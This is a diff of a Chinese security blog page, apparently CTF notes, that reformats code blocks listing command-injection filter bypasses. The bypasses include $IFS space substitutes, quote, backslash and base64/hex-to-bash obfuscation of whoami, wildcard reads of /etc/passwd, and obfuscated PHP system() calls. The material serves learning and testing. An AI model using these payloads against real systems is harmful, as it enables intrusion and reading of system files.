@@ -177,59 +177,22 @@
 <p>A|B: 管道命令，如：dir <em>.</em> /s/a | find /c &quot;.exe&quot; 表示：先执行 dir 命令，对其输出的结果执行后面的 find 命令</p>
 <p>A||B: 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令</p>
 <h3 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h3><p>空格绕过</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token environment constant">$IFS</span>
-<span class="token environment constant">$IFS</span><span class="token variable">$1</span>
-<span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>
-<span class="token environment constant">$IFS</span><span class="token variable">$9</span>
-<span class="token operator">&lt;</span>	 比如cat<span class="token operator">&lt;</span>a.tct:表示cat a.txt
-<span class="token operator">&lt;></span>
-<span class="token punctuation">&#123;</span>cat,flag.php<span class="token punctuation">&#125;</span>  //用逗号实现了空格功能，需要用<span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>括起来
-%20
-%09</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">IFS</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IFS<span class="variable">$1</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;IFS&#125;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">IFS<span class="variable">$9</span></span></span><br><span class="line">&lt;	 比如cat&lt;a.tct:表示cat a.txt</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125;  //用逗号实现了空格功能，需要用&#123;&#125;括起来</span><br><span class="line"><span class="meta">%</span><span class="bash">20</span></span><br><span class="line"><span class="meta">%</span><span class="bash">09</span></span><br></pre></td></tr></table></figure>
 
 <p>绕过关键字</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">wh<span class="token punctuation">\</span>o<span class="token punctuation">\</span>ami    //反斜线绕过
-<span class="token function">who</span><span class="token string">"a"</span>mi    //双引号绕过
-whoa<span class="token string">'m'</span>i    //单引号绕过
-whoam`<span class="token variable"><span class="token variable">`</span>i    //反引号绕过
-<span class="token builtin class-name">echo</span> d2hvYW1p<span class="token operator">|</span>base64 -d<span class="token operator">|</span><span class="token function">sh</span>  //base64绕过,其中d2hvYW1p是whoami的base64编码
-<span class="token builtin class-name">echo</span> d2hvYW1p<span class="token operator">|</span>base64 -d<span class="token operator">|</span>bash//base64绕过,其中d2hvYW1p是whoami的base64编码
-<span class="token variable">`</span></span><span class="token builtin class-name">echo</span> d2hvYW1p<span class="token operator">|</span>base64 -d` //将其base64解码,然后用反引号来执行命令
-<span class="token builtin class-name">echo</span> 77686F616D69 <span class="token operator">|</span> xxd -r -p <span class="token operator">|</span> <span class="token function">bash</span> //hex绕过,其中77686F616D69是whoami的hex编码
-//<span class="token variable">$*</span>和<span class="token variable">$@</span>，<span class="token variable">$x</span><span class="token punctuation">(</span>x 代表 <span class="token number">1</span>-9<span class="token punctuation">)</span>,<span class="token variable">$&#123;x&#125;</span><span class="token punctuation">(</span>x<span class="token operator">>=</span><span class="token number">10</span><span class="token punctuation">)</span> :比如ca<span class="token variable">$&#123;21&#125;</span>t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:
-wh<span class="token variable">$1oami</span>
-<span class="token function">who</span><span class="token variable">$@</span>ami
-whoa<span class="token variable">$*</span>mi</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">wh\o\ami    //反斜线绕过</span><br><span class="line">who&quot;a&quot;mi    //双引号绕过</span><br><span class="line">whoa&#x27;m&#x27;i    //单引号绕过</span><br><span class="line">whoam``i    //反引号绕过</span><br><span class="line">echo d2hvYW1p|base64 -d|sh  //base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">echo d2hvYW1p|base64 -d|bash//base64绕过,其中d2hvYW1p是whoami的base64编码</span><br><span class="line">`echo d2hvYW1p|base64 -d` //将其base64解码,然后用反引号来执行命令</span><br><span class="line">echo 77686F616D69 | xxd -r -p | bash //hex绕过,其中77686F616D69是whoami的hex编码</span><br><span class="line"><span class="meta">//$</span><span class="bash">*和<span class="variable">$@</span>，<span class="variable">$x</span>(x 代表 1-9),<span class="variable">$&#123;x&#125;</span>(x&gt;=10) :比如ca<span class="variable">$&#123;21&#125;</span>t a.txt表示cat a.txt    在没有传入参数的情况下,这些特殊字符默认为空,如下:</span></span><br><span class="line"><span class="meta">wh$</span><span class="bash">1oami</span></span><br><span class="line"><span class="meta">who$</span><span class="bash">@ami</span></span><br><span class="line"><span class="meta">whoa$</span><span class="bash">*mi</span></span><br></pre></td></tr></table></figure>
 
 <p>任意字符插入执行（可绕过命令和文件名）</p>
-<pre class="language-none"><code class="language-none">cat &#x2F;f&#96;who&#96;la&#96;ks&#96;g	反斜杠之间的字符会作为命令执行
-w&#96;\f1hgb&#96;ho&#96;\f1hgb&#96;am&#96;\f1hgb&#96;i  &#x2F;&#x2F;这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行
-wh$(f1hgb)oa$(f1hgb)mi            &#x2F;&#x2F;和上面的差不多,都说执行和拼接</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /f`who`la`ks`g	反斜杠之间的字符会作为命令执行</span><br><span class="line">w`\f1hgb`ho`\f1hgb`am`\f1hgb`i  //这个反斜线作用就是平时的那种连接,反引号的作用是把括起来的字符当做命令执行</span><br><span class="line">wh$(f1hgb)oa$(f1hgb)mi            //和上面的差不多,都说执行和拼接</span><br></pre></td></tr></table></figure>
 
 <p>只可绕过文件名</p>
-<pre class="language-none"><code class="language-none">cat fl[abc]g.php                                 &#x2F;&#x2F;匹配[abc]中的任何一个
-cat f[a-z]ag.txt                                 &#x2F;&#x2F;匹配a-z范围的任何字符
-cat fla*                                         &#x2F;&#x2F;用*匹配任意
-a&#x3D;f;d&#x3D;ag;c&#x3D;l;cat $a$c$d.php 表示cat flag.php       &#x2F;&#x2F;内联执行</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cat fl[abc]g.php                                 //匹配[abc]中的任何一个</span><br><span class="line">cat f[a-z]ag.txt                                 //匹配a-z范围的任何字符</span><br><span class="line">cat fla*                                         //用*匹配任意</span><br><span class="line">a=f;d=ag;c=l;cat $a$c$d.php 表示cat flag.php       //内联执行</span><br></pre></td></tr></table></figure>
 
 <p>文件名绕过</p>
-<pre class="language-shell" data-language="shell"><code class="language-shell">利用正则:比如要读取etc/passwd
-<span class="token function">cat</span> /???/??????
-<span class="token function">cat</span> /???/pass*
-<span class="token function">cat</span> /etc<span class="token variable">$u</span>/passwd</code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用正则:比如要读取etc/passwd</span><br><span class="line">cat /???/??????</span><br><span class="line">cat /???/pass*</span><br><span class="line">cat /etc$u/passwd</span><br></pre></td></tr></table></figure>
 
 <p>命令执行函数绕过</p>
-<pre class="language-none"><code class="language-none">system(&quot;cat &#x2F;etc&#x2F;passwd&quot;)
-&lt;&#x3D;&gt;
-&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;cat &#x2F;etc&#x2F;passwd&quot;);
-&lt;&#x3D;&gt;
-(sy.(st).em)(&quot;cat &#x2F;etc&#x2F;passwd&quot;);
-&lt;&#x3D;&gt;还可以用注释方法绕过
-&quot;system&#x2F;*fthgb666*&#x2F;(&quot;cat &#x2F;etc&#x2F;passwd);&quot;
-&lt;&#x3D;&gt;
-&quot;system&#x2F;*fthgb666*&#x2F;(wh.&#x2F;*fthgb666*&#x2F;(oa)&#x2F;*fthgb666*&#x2F;.mi);&quot;
-&lt;&#x3D;&gt;
-&quot;(sy.&#x2F;*fthgb666*&#x2F;(st)&#x2F;*fthgb666*&#x2F;.em)&#x2F;*fthgb666*&#x2F;(wh.&#x2F;*fthgb666*&#x2F;(oa)&#x2F;*fthgb666*&#x2F;.mi);&quot;</code></pre>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">system(&quot;cat /etc/passwd&quot;)</span><br><span class="line">&lt;=&gt;</span><br><span class="line">&quot;\x73\x79\x73\x74\x65\x6d&quot;(&quot;cat /etc/passwd&quot;);</span><br><span class="line">&lt;=&gt;</span><br><span class="line">(sy.(st).em)(&quot;cat /etc/passwd&quot;);</span><br><span class="line">&lt;=&gt;还可以用注释方法绕过</span><br><span class="line">&quot;system/*fthgb666*/(&quot;cat /etc/passwd);&quot;</span><br><span class="line">&lt;=&gt;</span><br><span class="line">&quot;system/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);&quot;</span><br><span class="line">&lt;=&gt;</span><br><span class="line">&quot;(sy./*fthgb666*/(st)/*fthgb666*/.em)/*fthgb666*/(wh./*fthgb666*/(oa)/*fthgb666*/.mi);&quot;</span><br></pre></td></tr></table></figure>
 
 
 
